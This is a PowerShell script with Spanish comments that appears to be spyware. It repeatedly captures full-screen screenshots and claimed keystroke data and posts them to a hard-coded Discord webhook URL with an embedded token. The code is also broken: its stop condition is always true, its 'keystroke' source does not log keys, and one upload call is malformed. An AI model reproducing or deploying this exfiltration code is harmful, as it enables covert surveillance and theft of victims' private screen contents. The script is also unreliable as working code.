# Definir la URL del webhook de Discord
$dc = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
$hookurl = $dc

# Definir el intervalo de tiempo entre capturas de pantalla en segundos
$seconds = 30

# Comando para detener el bucle principal
$stopCommand = "stop"

# Función para enviar las pulsaciones del teclado al webhook de Discord
function SendKeystrokesToDiscord {
    # Obtener el registro de pulsaciones de teclado
    $keystrokes = Get-WinEvent -FilterHashtable @{LogName='Application';ID=13} | Select-Object -ExpandProperty Message

    # Crear el cuerpo de la solicitud
    $body = @{
        content = $keystrokes
    } | ConvertTo-Json

    # Enviar las pulsaciones del teclado al webhook de Discord
    Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "application/json"
}

# Bucle principal: tomar dos capturas de pantalla cada 30 segundos y enviarlas al webhook de Discord
While ($true){
    # Verificar si se ha ingresado el comando de detención
    if ($stopCommand -eq "stop") {
        break
    }

    # Definir la ruta y el nombre de archivo para la captura de pantalla
    $file1 = "$env:temp\SC1_$(Get-Date -Format "yyyyMMdd_HHmmss").png"
    $file2 = "$env:temp\SC2_$(Get-Date -Format "yyyyMMdd_HHmmss").png"
    
    # Tomar la primera captura de pantalla
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap1 = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
    $graphic1 = [System.Drawing.Graphics]::FromImage($bitmap1)
    $graphic1.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap1.Size)
    $bitmap1.Save($file1, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Verificar si la primera captura de pantalla se guardó correctamente
    if (Test-Path $file1) {
        Write-Host "Primera captura de pantalla guardada correctamente en $file1"
    }
    else {
        Write-Host "Error al guardar la primera captura de pantalla en $file1"
    }

    # Esperar antes de tomar la segunda captura de pantalla
    Start-Sleep -Seconds $seconds
    
    # Tomar la segunda captura de pantalla
    $bitmap2 = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
    $graphic2 = [System.Drawing.Graphics]::FromImage($bitmap2)
    $graphic2.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap2.Size)
    $bitmap2.Save($file2, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Verificar si la segunda captura de pantalla se guardó correctamente
    if (Test-Path $file2) {
        Write-Host "Segunda captura de pantalla guardada correctamente en $file2"
    }
    else {
        Write-Host "Error al guardar la segunda captura de pantalla en $file2"
    }
    
    # Enviar ambas capturas de pantalla al webhook de Discord
    Invoke-RestMethod -Uri $hookurl -Method Post -InFile $file1 -InFile $file2
    
    # Eliminar las capturas de pantalla después de enviarlas
    Remove-Item -Path $file1, $file2
    
    # Enviar las pulsaciones del teclado al webhook de Discord cada 10 minutos
    SendKeystrokesToDiscord
    Start-Sleep -Seconds 600
}
